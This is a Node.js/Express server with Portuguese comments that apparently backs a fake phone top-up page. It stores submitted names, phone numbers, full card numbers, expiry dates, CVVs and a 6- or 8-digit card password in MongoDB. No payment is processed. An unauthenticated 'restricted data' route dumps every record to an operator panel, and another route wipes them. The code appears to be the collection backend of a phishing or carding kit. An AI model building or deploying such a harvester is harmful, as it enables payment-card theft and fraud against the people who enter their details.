const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

// Configurações para ler os dados do formulário
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Conexão com o seu MongoDB Atlas (Já configurado)
mongoose.connect('mongodb+srv://ingresso944_db_user:<db_password>@cluster0.wgnfod3.mongodb.net/?appName=Cluster0')
  .then(() => console.log('Conectado ao MongoDB!'))
  .catch(err => console.error('Erro ao conectar:', err));

// O "Desenho" dos dados que vamos salvar (Schema)
const RecargaSchema = new mongoose.Schema({
    operadora: String,
    nome: String,
    telefone: String,
    cartao: String,
    data: String,
    cvv: String,
    valor: String,
    senha: String, // Senha de 6 ou 8 dígitos do TCC
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// ROTA PARA SALVAR A RECARGA
app.post('/finalizar', async (req, res) => {
    try {
        const novaRecarga = new Recarga(req.body);
        await novaRecarga.save();
        res.status(200).send('Sucesso');
    } catch (error) {
        res.status(500).send('Erro ao salvar');
    }
});

// ROTA PARA O SEU PAINEL VER OS DADOS
app.get('/ver-dados-restritos', async (req, res) => {
    const dados = await Recarga.find().sort({ dataRegistro: -1 });
    res.json(dados);
});

// ROTA PARA LIMPAR TUDO (Botão do seu painel)
app.delete('/limpar-tudo', async (req, res) => {
    await Recarga.deleteMany({});
    res.send('Banco limpo');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));